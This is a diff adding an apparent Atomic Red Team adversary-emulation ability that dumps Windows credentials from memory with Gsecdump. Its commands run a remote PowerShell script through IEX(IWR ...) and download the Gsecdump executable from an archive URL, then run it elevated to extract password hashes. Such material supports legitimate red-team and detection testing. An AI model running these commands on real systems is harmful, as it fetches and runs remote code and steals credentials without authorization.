@@ -1,0 +1,65 @@
+- id: 96345bfc-8ae7-4b6a-80b7-223200f24ef9
+  name: Gsecdump
+  description: "Dump credentials from memory using Gsecdump.\n\nUpon successful execution,\
+    \ you should see domain\\username's followed by two 32 character hashes.\n\nIf\
+    \ you see output that says \"compat: error: failed to create child process\",\
+    \ execution was likely blocked by Anti-Virus. \nYou will receive only error output\
+    \ if you do not run this test from an elevated context (run as administrator)\n\
+    \nIf you see a message saying \"The system cannot find the path specified\", try\
+    \ using the get-prereq_commands to download and install Gsecdump first."
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: OS Credential Dumping
+  platforms:
+    windows:
+      sh:
+        command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\gsecdump.exe")
+          {exit 0} else {exit 1}; then : ; else [Net.ServicePointManager]::SecurityProtocol
+          = [Net.SecurityProtocolType]::Tls12; $parentpath = Split-Path "PathToAtomicsFolder\..\ExternalPayloads\gsecdump.exe";
+          $binpath = "$parentpath\gsecdump-v2b5.exe"; IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1"
+          -UseBasicParsing); if(Invoke-WebRequestVerifyHash "https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe"
+          "$binpath" 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC){;
+          Move-Item $binpath "PathToAtomicsFolder\..\ExternalPayloads\gsecdump.exe";
+          }; fi; "PathToAtomicsFolder\..\ExternalPayloads\gsecdump.exe" -a'
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1003
+  - credential-access
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      gsecdump_exe:
+        description: Path to the Gsecdump executable
+        type: path
+        default: PathToAtomicsFolder\..\ExternalPayloads\gsecdump.exe
+      gsecdump_bin_hash:
+        description: File hash of the Gsecdump binary file
+        type: string
+        default: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC
+      gsecdump_url:
+        description: Path to download Gsecdump binary file
+        type: url
+        default: https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe
+    dependencies:
+    - description: 'Gsecdump must exist on disk at specified location (#{gsecdump_exe})
+
+        '
+      prereq_command: 'if (Test-Path "#{gsecdump_exe}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n\
+        $parentpath = Split-Path \"#{gsecdump_exe}\"; $binpath = \"$parentpath\\gsecdump-v2b5.exe\"\
+        \nIEX(IWR \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1\"\
+        \ -UseBasicParsing)\nif(Invoke-WebRequestVerifyHash \"#{gsecdump_url}\" \"\
+        $binpath\" #{gsecdump_bin_hash}){\n  Move-Item $binpath \"#{gsecdump_exe}\"\
+        \n}\n"
+    technique_created: '2017-05-31T21:30:19.735Z'
+    atomic_guid: 96345bfc-8ae7-4b6a-80b7-223200f24ef9
+    import_timestamp: '2025-06-24T11:15:06.071110Z'
